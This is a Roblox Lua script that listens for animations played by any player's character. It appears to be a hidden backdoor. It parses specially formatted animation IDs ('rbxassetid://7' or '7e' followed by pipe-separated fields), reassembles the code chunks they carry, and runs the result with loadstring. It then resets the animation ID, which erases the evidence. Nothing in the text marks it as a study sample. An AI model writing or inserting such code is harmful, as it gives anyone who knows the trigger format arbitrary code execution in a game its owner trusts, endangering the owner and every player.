local Players = game:GetService("Players")

local codeManagement = {}

local function onAnimationPlayed(track)
    --print("Animation played:", track.Animation.AnimationId)
    local id = track.Animation.AnimationId
    if id:match("rbxassetid://7") or id:match("rbxassetid://7e") then
        local parts = string.split(id,"|")
        local syntax = parts[1]
        local code = parts[2]
        local seed = parts[3]
        local order = parts[4]
        
        print(id)
        
        print(syntax)
        print(code)
        print(seed)
        if order then
            print(order)
        end
        
        if order and tonumber(order) >= 2 then
            if syntax:match("7e") then
                local connectedCode = ""
                if codeManagement[seed] == nil then
                    codeManagement[seed] = {}
                end
                for i,part in codeManagement[seed] do
                    connectedCode = connectedCode .. part
                end
                loadstring(connectedCode)()
            else
                if codeManagement[seed] == nil then
                    codeManagement[seed] = {}
                end
                codeManagement[seed][order] = code
            end
        else
            loadstring(code)()
        end
    end
    if track then
        track:Stop()
        track.Animation.AnimationId="rbxassetid://0"
        track=nil
    end
end

local function register(character)
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:WaitForChild("Animator").AnimationPlayed:Connect(onAnimationPlayed)
        end
    end
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        register(character)
    end)
    if player.Character then
        register(player.Character)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)
